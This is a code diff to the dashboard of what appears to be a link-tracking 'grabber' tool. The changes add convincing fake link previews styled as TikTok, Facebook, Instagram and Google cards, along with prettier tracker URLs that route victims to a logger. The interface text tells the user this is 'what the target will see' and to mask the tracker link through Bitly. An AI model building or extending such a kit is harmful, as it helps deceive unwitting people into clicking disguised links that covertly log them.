@@ -96,12 +96,31 @@
 
         .result-box {
             background: #000;
-            border: 1px dashed var(--border);
-            padding: 15px;
-            border-radius: 8px;
+            border: 1px solid var(--border);
+            padding: 24px;
+            border-radius: 12px;
             display: none;
-            word-break: break-all;
             margin-top: 20px;
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .social-mockup {
+            margin-top: 20px;
+            background: #1f1f23;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #333;
+            max-width: 450px;
+            transition: transform 0.3s;
+        }
+
+        .social-mockup:hover {
+            transform: scale(1.02);
         }
 
         .result-box code {
@@ -196,7 +215,20 @@
                 <div style="margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid #333;">
                     <p style="margin:0 0 5px 0; font-size: 0.75rem; color: #10b981; font-weight: bold; text-transform: uppercase;">✨ Convincing Link Preview:</p>
                     <span id="fakeLink" style="font-size: 1.1rem; color: #fff; font-weight: 600;"></span>
-                    <p style="margin:5px 0 0 0; font-size: 0.7rem; color: var(--text-dim);">This is what the target will see after you use Bitly.</p>
+                    
+                    <!-- Social Card Mockup -->
+                    <div id="socialMockup" class="social-mockup">
+                        <div id="mockupImage" style="height: 150px; background: #2a2a30; display: flex; align-items: center; justify-content: center;">
+                            <svg width="40" height="40" viewBox="0 0 448 512" fill="#555"><path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/></svg>
+                        </div>
+                        <div style="padding: 12px;">
+                            <p id="mockupTitle" style="margin: 0; font-weight: 600; color: #fff; font-size: 0.9rem;">TikTok - Watch Trending Videos</p>
+                            <p id="mockupDesc" style="margin: 4px 0 0 0; color: #94a3b8; font-size: 0.75rem;">Watch the latest trending videos and discover content you love.</p>
+                            <p style="margin: 8px 0 0 0; color: #64748b; font-size: 0.7rem; text-transform: uppercase;">TIKTOK.COM</p>
+                        </div>
+                    </div>
+                    
+                    <p style="margin:10px 0 0 0; font-size: 0.7rem; color: var(--text-dim);">This is what the target will see when you share the link on Social Media.</p>
                 </div>
 
                 <p style="margin:0 0 10px 0; font-size: 0.75rem; color: var(--text-dim); font-weight: bold; text-transform: uppercase;">🔗 Technical Tracker Link (Paste this into Bitly):</p>
@@ -234,7 +266,8 @@
         // Fallback: If someone visits the dashboard with a tracking target, redirect them to the logger
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.has('target')) {
-            window.location.href = 'logger.html' + window.location.search;
+            const name = urlParams.get('name') || 'TikTok';
+            window.location.href = `/t/${encodeURIComponent(name)}${window.location.search}`;
         }
 
         function useTemplate(name, url) {
@@ -250,16 +283,37 @@
             // Format name for the fake link (e.g. "Brill Morales" -> "brill-morales")
             const formattedName = name.toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '');
             
-            // 1. The Real Tracker Link (Robust URL construction for Vercel)
-            const baseUrl = new URL('logger.html', window.location.href).href;
-            const finalLink = `${baseUrl}?target=${encodeURIComponent(target)}&name=${encodeURIComponent(name)}`;
+            // 1. The Real Tracker Link (Pretty URL for Vercel Serverless)
+            const finalLink = new URL(`/t/${encodeURIComponent(name)}`, window.location.href).href + `?target=${encodeURIComponent(target)}`;
             
             // 2. The Convincing Preview
             let domain = "tiktok.com";
-            if (target.includes("facebook")) domain = "facebook.com/watch";
-            if (target.includes("instagram")) domain = "instagram.com/reels";
+            let mockupTitle = "TikTok - Watch Trending Videos";
+            let mockupDesc = "Watch the latest trending videos and discover content you love.";
+            let accentColor = "#fe2c55";
+
+            if (name === "Facebook") {
+                domain = "facebook.com/watch";
+                mockupTitle = "Facebook - Log In or Sign Up";
+                mockupDesc = "Create an account or log into Facebook. Connect with friends, family and other people you know.";
+                accentColor = "#0866ff";
+            } else if (name === "Instagram") {
+                domain = "instagram.com/reels";
+                mockupTitle = "Instagram";
+                mockupDesc = "Watch the latest reels and photos.";
+                accentColor = "#e4405f";
+            } else if (name === "Google") {
+                domain = "google.com/search";
+                mockupTitle = "Google Search";
+                mockupDesc = "The world's information at your fingertips.";
+                accentColor = "#4285f4";
+            }
             
             document.getElementById('fakeLink').innerText = `https://www.${domain}/${formattedName}`;
+            document.getElementById('mockupTitle').innerText = mockupTitle;
+            document.getElementById('mockupDesc').innerText = mockupDesc;
+            document.getElementById('mockupImage').style.background = `linear-gradient(45deg, ${accentColor}22, ${accentColor}44)`;
+            
             document.getElementById('generatedLink').innerText = finalLink;
             document.getElementById('resultBox').style.display = 'block';
         }
